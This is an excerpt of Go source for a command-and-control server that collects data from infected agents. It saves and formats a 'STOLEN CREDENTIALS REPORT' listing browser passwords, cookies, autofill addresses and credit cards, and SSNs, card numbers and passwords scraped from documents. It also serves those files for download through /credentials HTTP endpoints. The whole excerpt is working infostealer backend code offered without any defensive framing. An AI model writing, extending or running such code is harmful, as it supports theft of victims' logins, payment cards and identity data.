...
func (c2 *C2Server) saveCredentialData(result *config.TaskResult) {
	...
	// Create filename with timestamp and agent info
	timestamp := time.Unix(result.Timestamp, 0).Format("2006-01-02_15-04-05")
	baseFilename := fmt.Sprintf("credentials_%s_%s_%s", result.AgentID[:8], result.TaskID[:8], timestamp)

	// Save as JSON (for programmatic access)
	jsonFilepath := filepath.Join(credentialsDir, baseFilename+".json")
	...
	if err := ioutil.WriteFile(jsonFilepath, jsonData, 0644); err != nil {
		log.Printf("Failed to save credential JSON for task %s: %v", result.TaskID, err)
		return
	}

	// Generate organized .txt file (for human reading)
	txtFilepath := filepath.Join(credentialsDir, baseFilename+".txt")
	txtContent := c2.generateOrganizedCredentialText(result.CredentialData, result.AgentID, result.TaskID, timestamp)

	if err := ioutil.WriteFile(txtFilepath, []byte(txtContent), 0644); err != nil {
		log.Printf("Failed to save credential TXT for task %s: %v", result.TaskID, err)
		return
	}
	...
	log.Printf("[CREDENTIALS] Saved %d stolen items for task %s: %s (%d bytes JSON, %d bytes TXT)",
		totalItems, result.TaskID, baseFilename, len(jsonData), len(txtContent))

	// Store the filenames for download links
	result.CredentialFiles = map[string]string{
		"json": baseFilename + ".json",
		"txt":  baseFilename + ".txt",
	}

	// Update the result output to include file paths
	result.Output += fmt.Sprintf("\nCredentials saved: %s (.json & .txt)", baseFilename)
}

// generateOrganizedCredentialText creates a human-readable organized text file
func (c2 *C2Server) generateOrganizedCredentialText(creds *config.StolenCredentials, agentID, taskID, timestamp string) string {
	var content strings.Builder

	// Header
	content.WriteString("═══════════════════════════════════════════════════════════════════════════════\n")
	content.WriteString("                             STOLEN CREDENTIALS REPORT                         \n")
	content.WriteString("═══════════════════════════════════════════════════════════════════════════════\n\n")

	content.WriteString(fmt.Sprintf("Agent ID:     %s\n", agentID))
	content.WriteString(fmt.Sprintf("Task ID:      %s\n", taskID))
	content.WriteString(fmt.Sprintf("Extracted:    %s\n", time.Unix(creds.Timestamp, 0).Format("2006-01-02 15:04:05 MST")))
	content.WriteString(fmt.Sprintf("Total Items:  %d\n\n",
		len(creds.BrowserPasswords)+len(creds.BrowserCookies)+len(creds.AutofillData)+len(creds.DocumentData)))

	// Browser Passwords Section
	if len(creds.BrowserPasswords) > 0 {
		content.WriteString("🔐 BROWSER PASSWORDS\n")
		content.WriteString(strings.Repeat("─", 79) + "\n")
		content.WriteString(fmt.Sprintf("Total: %d passwords\n\n", len(creds.BrowserPasswords)))

		// Group by browser
		browserGroups := make(map[string][]config.BrowserPassword)
		for _, pwd := range creds.BrowserPasswords {
			browserGroups[pwd.Browser] = append(browserGroups[pwd.Browser], pwd)
		}

		for browser, passwords := range browserGroups {
			content.WriteString(fmt.Sprintf("▼ %s (%d passwords)\n", browser, len(passwords)))
			for i, pwd := range passwords {
				content.WriteString(fmt.Sprintf("  %d. URL:      %s\n", i+1, pwd.URL))
	...
	if len(creds.BrowserCookies) > 0 {
		content.WriteString("🍪 BROWSER COOKIES\n")
		content.WriteString(strings.Repeat("─", 79) + "\n")
		content.WriteString(fmt.Sprintf("Total: %d cookies\n\n", len(creds.BrowserCookies)))

		// Group by host/domain
		hostGroups := make(map[string][]config.BrowserCookie)
		for _, cookie := range creds.BrowserCookies {
			hostGroups[cookie.Host] = append(hostGroups[cookie.Host], cookie)
		}

		for host, cookies := range hostGroups {
			content.WriteString(fmt.Sprintf("▼ %s (%d cookies)\n", host, len(cookies)))
			for i, cookie := range cookies {
				if i >= 5 { // Limit cookies per host for readability
					content.WriteString(fmt.Sprintf("  ... and %d more cookies\n", len(cookies)-5))
					break
				}
				content.WriteString(fmt.Sprintf("  %d. %s = %s\n", i+1, cookie.Name, cookie.Value[:min(50, len(cookie.Value))]))
	...
	if len(creds.AutofillData) > 0 {
		content.WriteString("📝 AUTOFILL DATA\n")
		content.WriteString(strings.Repeat("─", 79) + "\n")
		content.WriteString(fmt.Sprintf("Total: %d autofill entries\n\n", len(creds.AutofillData)))

		for i, autofill := range creds.AutofillData {
			content.WriteString(fmt.Sprintf("▼ Entry %d (%s)\n", i+1, autofill.Browser))
			if autofill.Name != "" {
			...
			if autofill.City != "" {
				content.WriteString(fmt.Sprintf("  City:     %s\n", autofill.City))
			}
			if autofill.State != "" {
				content.WriteString(fmt.Sprintf("  State:    %s\n", autofill.State))
			}
			if autofill.ZipCode != "" {
				content.WriteString(fmt.Sprintf("  Zip:      %s\n", autofill.ZipCode))
			}
			if autofill.Country != "" {
			...
			if autofill.CreditCard != "" {
				...
				if autofill.ExpiryMonth != "" && autofill.ExpiryYear != "" {
					content.WriteString(fmt.Sprintf("  Expiry:   %s/%s\n", autofill.ExpiryMonth, autofill.ExpiryYear))
				}
			}
			content.WriteString("\n")
		}
	...
	if len(creds.DocumentData) > 0 {
		content.WriteString("📄 DOCUMENT SECRETS\n")
		content.WriteString(strings.Repeat("─", 79) + "\n")
		content.WriteString(fmt.Sprintf("Total: %d documents scanned\n\n", len(creds.DocumentData)))

		for i, doc := range creds.DocumentData {
			totalSecrets := len(doc.Passwords) + len(doc.EmailAddresses) + len(doc.CreditCards) + len(doc.SSNs) + len(doc.PhoneNumbers)
			if totalSecrets == 0 {
				continue
			}
			...
			content.WriteString(fmt.Sprintf("  Secrets:  %d items found\n", totalSecrets))

			if len(doc.Passwords) > 0 {
				content.WriteString("  Passwords found:\n")
				for _, pwd := range doc.Passwords {
					content.WriteString(fmt.Sprintf("    - %s\n", pwd))
				}
			}

			if len(doc.EmailAddresses) > 0 {
				content.WriteString("  Email addresses:\n")
				for _, email := range doc.EmailAddresses {
					content.WriteString(fmt.Sprintf("    - %s\n", email))
				}
			}

			if len(doc.CreditCards) > 0 {
				content.WriteString("  Credit cards:\n")
				for _, card := range doc.CreditCards {
					content.WriteString(fmt.Sprintf("    - %s\n", card))
				}
			}

			if len(doc.SSNs) > 0 {
				content.WriteString("  SSN numbers:\n")
				for _, ssn := range doc.SSNs {
					content.WriteString(fmt.Sprintf("    - %s\n", ssn))
				}
			}

			if len(doc.PhoneNumbers) > 0 {
				content.WriteString("  Phone numbers:\n")
				for _, phone := range doc.PhoneNumbers {
					content.WriteString(fmt.Sprintf("    - %s\n", phone))
				}
			}
...
// handleCredentials serves credential files for download
func (c2 *C2Server) handleCredentials(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		// List available credential files
		c2.listCredentialFiles(w, r)
	} else {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

func (c2 *C2Server) listCredentialFiles(w http.ResponseWriter, r *http.Request) {
	credentialsDir := "credentials"
	files, err := ioutil.ReadDir(credentialsDir)
	if err != nil {
		http.Error(w, "Failed to read credentials directory", http.StatusInternalServerError)
		return
	}

	credentials := make([]map[string]interface{}, 0)
	for _, file := range files {
		if !file.IsDir() && (strings.HasSuffix(file.Name(), ".json") || strings.HasSuffix(file.Name(), ".txt")) {
			credentials = append(credentials, map[string]interface{}{
				"filename": file.Name(),
				"size":     file.Size(),
				"modified": file.ModTime(),
				"url":      fmt.Sprintf("/credentials/%s", file.Name()),
			})
		}
	}
...
func (c2 *C2Server) handleCredentialFile(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	...
	filename := strings.TrimPrefix(r.URL.Path, "/credentials/")
	if filename == "" {
	...
	if _, err := os.Stat(filepath); os.IsNotExist(err) {
		http.Error(w, "Credential file not found", http.StatusNotFound)
		return
	}
...
func (c2 *C2Server) StartHTTPServer() {
	...
	mux.HandleFunc("/credentials", c2.handleCredentials)
	mux.HandleFunc("/credentials/", c2.handleCredentialFile)
	...
	log.Printf("  GET  /credentials - List credential files")
	log.Printf("  GET  /credentials/<filename> - Serve credential file")
